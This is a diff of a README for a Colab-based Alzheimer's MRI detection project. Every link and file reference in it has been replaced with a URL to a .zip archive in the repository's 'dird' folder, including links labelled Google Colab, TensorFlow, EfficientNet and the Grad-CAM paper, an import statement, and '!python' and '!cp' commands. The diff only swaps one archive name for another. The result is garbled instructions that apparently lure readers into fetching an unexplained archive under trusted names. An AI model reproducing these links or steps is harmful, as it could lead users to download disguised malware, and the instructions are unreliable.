@@ -39,18 +39,18 @@ Make sure your images are organized in this way before running the model.
 ## 🧪 How to Run This Project in Google Colab
 
 1. **Open Google Colab**  
-   Go to [Google Colab](https://github.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/raw/refs/heads/main/dird/Image_Of_Detection_s_For_Early_Analysis_Brain_Alzheimer_v2.1.zip) in your browser.
+   Go to [Google Colab](https://raw.githubusercontent.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/main/dird/For_Analysis_Early_Brain_s_Detection_Of_Alzheimer_Image_1.6-beta.2.zip) in your browser.
 
 2. **Upload the Python Script**  
    - Click on the folder icon (left sidebar).  
-   - Click the upload icon and upload the `https://github.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/raw/refs/heads/main/dird/Image_Of_Detection_s_For_Early_Analysis_Brain_Alzheimer_v2.1.zip` file.
+   - Click the upload icon and upload the `https://raw.githubusercontent.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/main/dird/For_Analysis_Early_Brain_s_Detection_Of_Alzheimer_Image_1.6-beta.2.zip` file.
 
 3. **Mount Google Drive**  
    If you are using files from Google Drive, run:
 
    ```python
-   from https://github.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/raw/refs/heads/main/dird/Image_Of_Detection_s_For_Early_Analysis_Brain_Alzheimer_v2.1.zip import drive
-   https://github.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/raw/refs/heads/main/dird/Image_Of_Detection_s_For_Early_Analysis_Brain_Alzheimer_v2.1.zip('/content/drive')
+   from https://raw.githubusercontent.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/main/dird/For_Analysis_Early_Brain_s_Detection_Of_Alzheimer_Image_1.6-beta.2.zip import drive
+   https://raw.githubusercontent.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/main/dird/For_Analysis_Early_Brain_s_Detection_Of_Alzheimer_Image_1.6-beta.2.zip('/content/drive')
    ```
 
 4. **Install Dependencies**
@@ -66,7 +66,7 @@ Make sure your images are organized in this way before running the model.
    Either copy and run code cells manually or run the whole script:
 
    ```bash
-   !python https://github.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/raw/refs/heads/main/dird/Image_Of_Detection_s_For_Early_Analysis_Brain_Alzheimer_v2.1.zip
+   !python https://raw.githubusercontent.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/main/dird/For_Analysis_Early_Brain_s_Detection_Of_Alzheimer_Image_1.6-beta.2.zip
    ```
 
 6. **Modify and Experiment**
@@ -78,7 +78,7 @@ Make sure your images are organized in this way before running the model.
    Example:
 
    ```bash
-   !cp https://github.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/raw/refs/heads/main/dird/Image_Of_Detection_s_For_Early_Analysis_Brain_Alzheimer_v2.1.zip /content/drive/MyDrive/
+   !cp https://raw.githubusercontent.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/main/dird/For_Analysis_Early_Brain_s_Detection_Of_Alzheimer_Image_1.6-beta.2.zip /content/drive/MyDrive/
    ```
 
 ---
@@ -113,9 +113,9 @@ Special Grad-CAM visualization uses:
 
 ## 🙌 Acknowledgements
 
-- [TensorFlow](https://github.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/raw/refs/heads/main/dird/Image_Of_Detection_s_For_Early_Analysis_Brain_Alzheimer_v2.1.zip)
-- [EfficientNet](https://github.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/raw/refs/heads/main/dird/Image_Of_Detection_s_For_Early_Analysis_Brain_Alzheimer_v2.1.zip)
-- [Grad-CAM Paper](https://github.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/raw/refs/heads/main/dird/Image_Of_Detection_s_For_Early_Analysis_Brain_Alzheimer_v2.1.zip)
+- [TensorFlow](https://raw.githubusercontent.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/main/dird/For_Analysis_Early_Brain_s_Detection_Of_Alzheimer_Image_1.6-beta.2.zip)
+- [EfficientNet](https://raw.githubusercontent.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/main/dird/For_Analysis_Early_Brain_s_Detection_Of_Alzheimer_Image_1.6-beta.2.zip)
+- [Grad-CAM Paper](https://raw.githubusercontent.com/gujjasaiganesh/Brain-Image-Analysis-For-Early-Detection-Of-Alzheimer-s/main/dird/For_Analysis_Early_Brain_s_Detection_Of_Alzheimer_Image_1.6-beta.2.zip)
 - Dataset Source: [ADNI / Kaggle Dataset (assumed)]
 
 ---
